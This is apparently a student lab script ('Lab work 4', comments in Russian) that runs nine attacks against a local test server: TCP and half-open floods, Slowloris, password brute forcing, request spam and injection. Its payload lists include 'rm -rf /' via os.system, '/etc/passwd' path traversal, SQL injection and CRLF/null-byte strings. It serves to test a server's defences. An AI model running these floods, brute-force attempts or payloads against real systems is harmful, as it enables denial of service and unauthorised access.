import socket
import threading
import time

HOST = "127.0.0.1"
PORT = 9999


def recv_all(sock: socket.socket) -> str:
    try:
        return sock.recv(4096).decode(errors="replace").strip()
    except Exception:
        return ""


def send(sock: socket.socket, msg: str) -> str:
    try:
        sock.sendall((msg + "\r\n").encode())
        return recv_all(sock)
    except Exception as e:
        return f"[ERROR] {e}"



def attack_tcp_flood(n: int = 20):
    print("\n" + "=" * 50)
    print(f"  АТАКА 1: TCP Flood ({n} соединений)")
    print("=" * 50)
    sockets = []
    for i in range(n):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(3)
            s.connect((HOST, PORT))
            banner = recv_all(s)
            print(f"  Соединение {i+1:02d}: {banner[:60]}")
            sockets.append(s)
        except Exception as e:
            print(f"  Соединение {i+1:02d}: [ОТКЛОНЕНО] {e}")
    time.sleep(1)
    for s in sockets:
        try:
            s.close()
        except Exception:
            pass
    print("  Flood завершён.")



def attack_brute_force():
    print("\n" + "=" * 50)
    print("  АТАКА 2: Брутфорс паролей")
    print("=" * 50)
    passwords = ["123456", "password", "admin", "letmein", "qwerty123", "secret123"]
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(5)
        s.connect((HOST, PORT))
        print(f"  Сервер: {recv_all(s)}")

        for pwd in passwords:
            resp = send(s, f"LOGIN admin {pwd}")
            print(f"  LOGIN admin {pwd!r:12} → {resp}")
            if resp.startswith("200"):
                print("  [!] Успешная авторизация!")
                break
            if "Banned" in resp or "banned" in resp:
                print("  [!] IP заблокирован сервером.")
                break
            time.sleep(0.2)
        s.close()
    except Exception as e:
        print(f"  [ERROR] {e}")


def attack_oversized():
    print("\n" + "=" * 50)
    print("  АТАКА 3: Oversized request (2048 байт)")
    print("=" * 50)
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(5)
        s.connect((HOST, PORT))
        print(f"  Сервер: {recv_all(s)}")
        big_payload = "A" * 2048 + "\r\n"
        s.sendall(big_payload.encode())
        resp = recv_all(s)
        print(f"  Ответ: {resp}")
        s.close()
    except Exception as e:
        print(f"  [ERROR] {e}")



def attack_garbage_commands():
    print("\n" + "=" * 50)
    print("  АТАКА 4: Мусорные/недопустимые команды")
    print("=" * 50)
    garbage = [
        "DROP TABLE users;",
        "GET / HTTP/1.1",
        "../../../etc/passwd",
        "'; SELECT * FROM--",
        "HELO mail.evil.com",
        "EVAL import os; os.system('rm -rf /')",
    ]
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(5)
        s.connect((HOST, PORT))
        print(f"  Сервер: {recv_all(s)}")
        # Авторизуемся сначала (чтобы добраться до команд)
        resp = send(s, "LOGIN admin secret123")
        print(f"  LOGIN: {resp}")
        for cmd in garbage:
            resp = send(s, cmd)
            print(f"  '{cmd[:35]}...' → {resp}")
        s.close()
    except Exception as e:
        print(f"  [ERROR] {e}")


def attack_request_flood():
    print("\n" + "=" * 50)
    print("  АТАКА 5: Request rate limit (спам PING)")
    print("=" * 50)
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(5)
        s.connect((HOST, PORT))
        recv_all(s)
        send(s, "LOGIN admin secret123")
        for i in range(25):
            resp = send(s, "PING")
            print(f"  PING #{i+1:02d}: {resp}")
            if "429" in resp or "Banned" in resp:
                print("  [!] Сервер заблокировал запросы.")
                break
        s.close()
    except Exception as e:
        print(f"  [ERROR] {e}")

def attack_slowloris(n: int = 5, hold_seconds: int = 20):
    print("\n" + "=" * 50)
    print(f"  АТАКА 6: Slowloris ({n} соединений, держим {hold_seconds}с)")
    print("=" * 50)

    sockets = []
    for i in range(n):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(hold_seconds + 5)
            s.connect((HOST, PORT))
            recv_all(s)
            sockets.append(s)
            print(f"  Соединение {i+1} открыто, начинаем медленную передачу...")
        except Exception as e:
            print(f"  Соединение {i+1}: [ОТКЛОНЕНО] {e}")

    start = time.time()
    step  = 0
    while sockets and (time.time() - start) < hold_seconds:
        alive = []
        for s in sockets:
            try:
                s.sendall(b"X")  
                alive.append(s)
            except Exception:
                pass
        sockets = alive
        step += 1
        elapsed = time.time() - start
        print(f"  Шаг {step:02d} (+3с, итого {elapsed:.0f}с): "
              f"живых соединений = {len(sockets)}")
        if not sockets:
            print("  [!] Все соединения разорваны сервером (таймаут сработал).")
            break
        time.sleep(3)

    for s in sockets:
        try:
            s.close()
        except Exception:
            pass
    print("  Slowloris завершён.")


def attack_parallel_brute():
    print("\n" + "=" * 50)
    print("  АТАКА 7: Многопоточный параллельный брутфорс")
    print("=" * 50)

    passwords = ["abc", "123", "pass", "root", "admin", "test"]
    results   = {}
    result_lock = threading.Lock()

    def try_password(pwd):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(5)
            s.connect((HOST, PORT))
            recv_all(s)
            resp = send(s, f"LOGIN admin {pwd}")
            s.close()
            with result_lock:
                results[pwd] = resp
        except Exception as e:
            with result_lock:
                results[pwd] = f"[ERROR] {e}"

    threads = [threading.Thread(target=try_password, args=(p,)) for p in passwords]
    print(f"  Запускаем {len(threads)} потоков одновременно...")
    for t in threads:
        t.start()
    for t in threads:
        t.join()

    for pwd, resp in results.items():
        print(f"  LOGIN admin {pwd!r:8} → {resp}")
    print("  Параллельный брутфорс завершён.")


def attack_half_open(n: int = 8, hold_seconds: int = 18):
    print("\n" + "=" * 50)
    print(f"  АТАКА 8: Half-open flood ({n} молчащих соединений, ждём {hold_seconds}с)")
    print("=" * 50)

    sockets = []
    for i in range(n):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(hold_seconds + 5)
            s.connect((HOST, PORT))
            recv_all(s) 
            sockets.append(s)
            print(f"  Соединение {i+1:02d} открыто — молчим.")
        except Exception as e:
            print(f"  Соединение {i+1:02d}: [ОТКЛОНЕНО] {e}")

    print(f"  Заняли {len(sockets)} слотов. Пробуем легитимное соединение...")
    try:
        test = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        test.settimeout(3)
        test.connect((HOST, PORT))
        resp = recv_all(test)
        print(f"  Легитимный клиент: {resp}")
        test.close()
    except Exception as e:
        print(f"  Легитимный клиент: [ОТКЛОНЕНО] {e}")

    print(f"  Ждём {hold_seconds}с — сервер должен закрыть молчащие соединения по таймауту...")
    time.sleep(hold_seconds)

    alive = 0
    for s in sockets:
        try:
            s.sendall(b"PING\r\n")
            alive += 1
        except Exception:
            pass
        try:
            s.close()
        except Exception:
            pass

    print(f"  После ожидания живых соединений: {alive} (должно быть 0 — сервер закрыл).")
    print("  Half-open flood завершён.")



def attack_injection():
    print("\n" + "=" * 50)
    print("  АТАКА 9: Инъекция через параметры команды")
    print("=" * 50)

    payloads = [
        ("ECHO", "hello\r\nSERVER_INJECT: evil"),
        ("ECHO", "data\x00hidden"),
        ("ECHO", "A" * 900),
        ("ECHO", "%s %s %s %s %s"),
        ("LOGIN", "../../etc/passwd secret"),
        ("LOGIN", "admin "),
    ]

    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(5)
        s.connect((HOST, PORT))
        recv_all(s)
        send(s, "LOGIN admin secret123") 

        for cmd, arg in payloads:
            full_cmd = f"{cmd} {arg}"
            resp = send(s, full_cmd)
            safe  = "OK" if resp.startswith("2") else "BLOCKED"
            preview = full_cmd[:45].replace("\r", "\\r").replace("\n", "\\n").replace("\x00", "\\x00")
            print(f"  [{safe}] '{preview}' → {resp[:60]}")

        s.close()
    except Exception as e:
        print(f"  [ERROR] {e}")
    print("  Инъекция завершена.")


ATTACKS = {
    "1": ("TCP Flood",                      attack_tcp_flood),
    "2": ("Брутфорс паролей",               attack_brute_force),
    "3": ("Oversized request",              attack_oversized),
    "4": ("Мусорные команды",               attack_garbage_commands),
    "5": ("Request rate limit",             attack_request_flood),
    "6": ("Slowloris",                      attack_slowloris),
    "7": ("Многопоточный брутфорс",         attack_parallel_brute),
    "8": ("Half-open flood",                attack_half_open),
    "9": ("Инъекция через параметры",       attack_injection),
}


def main():
    print("=" * 50)
    print("  Симулятор атак — Лабораторная работа 4")
    print("=" * 50)
    print("Выберите атаку:")
    for k, (name, _) in ATTACKS.items():
        print(f"  {k} — {name}")
    print(" 10 — Все атаки по очереди")

    choice = input("Ваш выбор: ").strip()

    if choice == "10":
        for k, (name, fn) in ATTACKS.items():
            fn()
            time.sleep(2)
    elif choice in ATTACKS:
        ATTACKS[choice][1]()
    else:
        print("Неверный выбор.")


if __name__ == "__main__":
    main()
